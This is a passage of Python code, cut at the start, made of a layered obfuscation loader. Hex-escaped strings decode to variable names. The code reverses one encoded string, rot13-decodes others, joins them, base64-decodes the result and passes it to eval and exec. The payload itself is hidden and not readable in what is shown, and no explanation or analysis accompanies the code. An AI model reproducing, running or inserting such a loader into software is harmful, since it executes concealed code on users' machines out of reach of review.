49\x30\x63\x58\x44\x30\x58\x56\x50\x4e\x74\x51\x44\x63\x78\x6e\x4a\x53\x66\x6f\x32\x70\x68\x6f\x32\x66\x62\x4c\x4a\x45\x78\x6f\x32\x35\x73\x6f\x7a\x53\x67\x4d\x46\x6a\x74\x57\x31\x4f\x69\x70\x61\x45\x75\x6f\x55\x5a\x74\x71\x4b\x4f\x78\x4c\x4b\x45\x79\x4d\x50\x6a\x74\x70\x7a\x49\x6d\x71\x54\x53\x6c\x71\x50\x4f\x59\x6f\x32\x45\x63\x59\x76\x34\x68\x57\x6c\x78\x41\x50\x7a\x39\x6d\x59\x79\x39\x79\x72\x54\x79\x30\x58\x51\x52\x63'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63\x5b\x3a\x3a\x2d\x31\x5d') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))